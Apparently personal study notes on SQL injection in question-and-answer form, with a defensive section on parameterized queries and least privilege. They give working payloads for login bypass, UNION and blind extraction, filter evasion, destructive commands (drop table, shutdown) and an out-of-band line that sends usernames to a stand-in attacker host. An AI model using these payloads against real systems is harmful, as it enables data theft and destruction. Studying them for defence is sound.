- How could you bypass the login functionnality of with the following SQL statement?
    SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’

        SELECT * FROM users WHERE username = '' OR 1=1 --' and password = ‘secret’

        what was sent by the user: ' OR 1=1 --

- What (how) would you inject in the following query in order to modify it, but to not discard the rest of the query like in the above example?
    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and published=1


        SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR ‘a’=’a’ and published=1

        what was sent by the user: Wiley’ OR ‘a’=’a

- Is is possible for an attacker to take full control of the server via SQL injection?
    Yes

- Could it be possible to create an admin user with a SQL injection attack? How? (Give an example)
    INSERT INTO users (username, password, ID, priveleges) VALUES (‘daf’, ‘secret’, 2248, 1)

    ‘daf’, ‘secret’ are inputs

    so with the input foo’, ‘bar’, 9999, 0)--

    INSERT INTO users (username, password, ID, priveleges) VALUES (‘foo’, ‘bar’, 9999, 0)--, ‘secret’, 2248, 1)

- Give an example of how an attacker could use SQL injection to bypass password check on a change password statement?
    UPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password = ‘secret’

        with username value admin’--

        UPDATE users SET password=’newsecret’ WHERE user = ‘admin’--’ and password = ‘secret’

- What is the easiest way to detect a possible SQL injection vulnerability?
    Input an unexpected character, for example '

- Where can you typically inject a SQL statement?
    String Data
        Break out of the quotation mark
    Numeric Data
        Sometime the data is put between quotation mark, but most of the time it does not. In this case, you can try to send a mathematical expression that equals the original value (ex: 3-1), if it succeeds, it may be vulnerable. 
    Query Structure
        For example, with the order by clause, if it is supplied by the user, for exmaple to sort a list:
            SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY title ASC
        title is directly given by the user, no escaping is necessary

- What is the concequence to allow user to specify collumn names?
    Using prepared statements or escaping single quotes won't prevent this type of injection.

- What is fingerprinting the database? How would you do that?
    It is to know what kind of technology is running the DB.
    You usually send a payload that will work on one type of DB, but fail on all the others.

    For example, string concatenation:
        Oracle: 'serv'||'ices'
        MS-SQL: 'serv'+'ices'
        MySQL: 'serv' 'ices'

- How would an attacker inject his own select statement in a query?
    By using the union statement:
        select author from books where title = 'banana' union select user from users --'

        injected banana' union select user from users --

- Give a strategy to inject a union blindly (do not know the tables attributes)
    First, you need to know how many columns there are. In the select, add NULLs (they can be converted to any data type) until you have the right numbers (otherwise it will fail)

        ' union select null--
        ' union select null, null --
        ' union select null, null, null --

    Then you test for data type (will fail if is not the same or cannot be converted)

        ' union select a, null, null --
        ' union select null, a, null --
        ' union select null, null, a --

- How could an attacker extract the names of the tables and columns?
    By querying the metadata table information_schema.columns
        union select table_name, column_name, null, null, null from information_schema.columns--

         SELECT table_name,column_name FROM all_tab_ columns (on Oracle)

- How could you inject if ' is encoded/filtered?
    Construct the string with ASCII value
        select ename, sal from emp where ename=’marcus’:

        is the same as:

        SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)|| CHR(114)||CHR(99)||CHR(117)||CHR(115)

- How can you inject if the comment symbol is blocked?
    Craft the input such as it does not break the query
         ‘ or 1=1--

         you can inject: 

         ‘ or ‘a’=’a

- How could you circumvent simple validation? Ex: The SELECT statement is blocked or removed.
    SeLeCt
    %00SELECT
    SELSELECTECT
    %53%45%4c%45%43%54
    %2553%2545%254c%2545%2543%2554

- How can an attacker use SQL comments to bypass validation?
    Simulating white spaces
        SELECT/*foo*/username,password/*foo*/FROM/*foo*/users

    With MySQL, directly in the statements
        SEL/*foo*/ECT username,password FR/*foo*/OM users

- What is second-order SQL injection?
    Lets say that the developpers have mitigated injection risk at user registration (for example, by doubling the ' when it is inputted)
        myname'

        insert into users values 'myname'''

        so the literal myname' will be stored

    Well, nothing says that the application is protected somewhere else, this data could be used somewhere else without any protection, for example, when changing the password:
        SELECT password FROM users WHERE username = 'myname''

        will break

        this is where the attacker's payload would be executed, at somewhere else in the application.

- What kind of destructive action can an attacker inject?
    ' shutdown -- (turns off the db)
    ' drop table users--

- How could an attaker retrieve data as numbers? For example, when ' is handled properly.
    By using ASCII, which returns the ASCII code of the letter and SUBSTRING which returns a sucstring of the output
        SUBSTRING(‘Admin’,1,1) returns A. 
        ASCII(‘A’) returns 65.

        ASCII(SUBSTR(‘Admin’,1,1))

- Sometimes, there is an SQL injection issue, but nothing is sent back to the client (except maybe an error message). How do you extract the data then?
    If an error message is returned, try blind SQL injection.
        - How?
            By extracting the table/attributes name with ASCII and SUBSTRING one bit at a time (true/false behavior)
    You can also use out-of-band channel (given the DB allows it)
        Take the following statement

        SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’

        Injecting this (join the result to the item the attacker controls):

        foo’ ||  (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)--

        results in the follwing query

        SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)

        appending the results to foo. Now you need to be able to retrieve the results of the query.

        For example, with Oracle, you can create an out-of-band connection with UTL_HTTP. (Even low-privileged users can create those)
        /employees.asp?EmpNo=7521’||UTL_HTTP.request(‘mdattacker.net:80/’|| (SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--

    You can also use the behavior of the DB itself to induce a conditionnal response, usefull when no errors are returned to the client. For example
        SELECT X FROM Y WHERE C
        if C is never true, than X will never be evaluated. Put 1/0 in X, if C is true, then the query will fail and vice versa

- What technique could an attacker use is none of the above methods works? How does it work?
    Time delays
    If the expression is evaluated in one way, it will cause a delay, the other way it won't
        Ex: if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’

- What kind of attacks can be escalated from SQL injection?
    If DB is shared with other applications, may be able to escalate privileges within the DB
    May be able to compromise the OS of the DB server
    In a DB you are sometime considered in a safe zone, so you could be able to reach key services on other hosts
    Make network connections back out of the osting infrastructure to the attacker's computer
    Reimplement functionnality that has been removed or disabled.

- Should we defend DBs against authenticated users? Even admin?
    Yes, because it is not impossible for an attacker to authenticate as a user

- What are some partially effective measures? Why are they not totally effective?
    Escape any '
        Numeric user-suplied data is being embedded into SQL queries are usually not encapsulated into '', the attacker can break out of the data context by simply entering arbitrary SQL
        Second-order SQL injection attacks (doubled quotation marks return to their original form when the data is used)
    Stored procedures for all DB access
        Poorly written stored proceedure can contain injection vulnerabilities
        Robust stored procedure can be invoked in an unsafe way using user-supplied input.

- So, how do you handle securly user input?
    With parameterized queries.
        The application specifies the query's structure, leaving placeholders for each item of user input
        The application specifies the contents of each placeholder

        The input is therefore always interpreted as data.

        unsafe:
            //define the query structure 
            String queryText = “select ename,sal from emp where ename =’”;
            //concatenate the user-supplied name 
            queryText += request.getParameter(“name”); queryText += “’”;
            // execute the query 
            stmt = con.createStatement(); rs = stmt.executeQuery(queryText);

        safe:
            //define the query structure 
            tring queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;
            //prepare the statement through DB connection “con” 
            stmt = con.prepareStatement(queryText);
            //add the user input to variable 1 (at the first ? placeholder) 
            stmt.setString(1, request.getParameter(“name”));
            // execute the query 
            rs = stmt.executeQuery();

    If the name of a table/column is supplied by the user, use a white list of good values

- What other security measures could be used? (defense in dept)
    The application should use the lowest possible level of priviliges when accessing the DB
    Unnecessary functions should be removed or disabled.
    All vendor-issued security patches sould be evaluated, tested and applied in a timely way.

--------------------------------------------------------------------------------------------
Ethical Hacking: SQL injection
--------------------------------------------------------------------------------------------

- Is it common problem that Website uses the same access rights to the DB no matter if the user is authenticated or not, admin or not?
    Yes

- A successful attack has impact on what?
    Confidentiality
    Integrity
    Availability
        Droping tables

- Is it possible to run more than 1 query at the same time?
    Yes
        select * from A; select * from B

- What are the 3 types of SQL injection?
    Error based
        The application raises errors of the underlying db (tells us everything)
    Union based injection
        Take a result set of a legitimate query and merge it with our malicious one, to pump the data to the application
    Blind SQL injection
        Cannot directly see the data, need to get it implicitly
        Boolean based
        Time based

- What is the most common character to detect SQLi?
    '

- Are all HTTP verbs at risk?
    Yes, even update, delete, etc.

- How do you identify SQLi risks in code?
    Appending the parameter instead of parametirizing it
    Not whitelisting

- What is the main constraint on using the union based SQLi?
    Have the same number of columns in the crafted, second part of the query and the legitimate, first part of the query

- How could you discover the table internal implementation (table name, columns name)?
    By trying different guess (for example, if there is a vote feature, there might be a vote or votes table)

    or

    select * from sys.tables
    select name from sys.tables
    select object_id from sys.tables

    select * from sys.columns

    select * from sys.columns where object_id = (the object_id of the table)

     www.mysite.com/Car?Cylinders=V12' union select object_id, name from sys.tables--
     www.mysite.com/Car?Cylinders=V12' union select name from sys.columns where object_id = xxxxxxxxxx--

- How can you disclose the value of an item in an error message of the db?
    www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 password from userprofile)--

    results in a conversion error to int, disclosing the value that was not castable, the password value

- How do you use error based injection to extract internal implementation? (For example, when the vulnerable query does not return results to the client front-end)
    www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 name from sys.table)--

    - How could you get the 5th name?
        www.mysite.com/Car?Cylinders=V12' and 1=(select top 1 name from (select top 5 name from sys.table order by name) t order name desc--

        In other words, getting the 5 first result and only returning the first element after ordering the elments descending

        1      5 <-----
        2      4
        3  ->  3
        4      2
        5      1

- What is the blind SQli sucess criteria?
    The command executed on the DB can be manipulated by the attacker

- Given the following query, how would you inject a blind SQLi?
    www.mysite.com/Car/Leaderboard?orderBy=power

    www.mysite.com/Car/Leaderboard?orderBy=(select top 1 password from userprofile) -> success
    www.mysite.com/Car/Leaderboard?orderBy=(select top 1 password2 from userprofile) -> error

    just need to be a valid sql statement, doesn't necessarly have to return the result that the application expect

- How could you use the case statement to have different (valid) responses using blind SQLi?
    select * from car order by

    case when ... then ... else ... end

    desc



    select * from car order by

    case when (select count(*) from sys.tables)=10) then power else speed end

    desc

- How do you blindly extract the name of a table?
    Enumerating characters

        select * from car order by

        case when (select top 1 substring(name, 1, 1) from sys.tables)='a' then power else speed end

        desc

    Enumerating ASCII values

        select * from car order by

        case when (select top 1 ASCII(lower(substring(name, 1, 1))) from sys.tables)<=109 then power else speed end     109 is ASCII value of m

        desc

- Where should you use a time based injection attack?
    When you do not have any kind of feedback from the response. (like a 204)
        There is no response body

- Give an example of a time based injection attack.
    somevalidstuff'); if select top 1 ASCII(lower(substring(name, 1, 1))) from sys.tables)<=109 waitfor delay '00:00:05'--

- How can you establish the account identity and rights?
    Every db has its own semantic for that, for example with MySQL, you can use curent_user to know the current user and is_rolemember to check if the current user possess the given rights.

    Ex:

    www.mysite.com/Car?Cylinger=V12' and 1=(select is_rolemember('db_owner'))--

- How could you discover other db names?
    www.mysite.com/Car?Cylinger=V12' union select name from sysdatabases (MySQL)

    to use one:

    www.mysite.com/Car?Cylinger=V12' union select name from [01-injection].sys.tables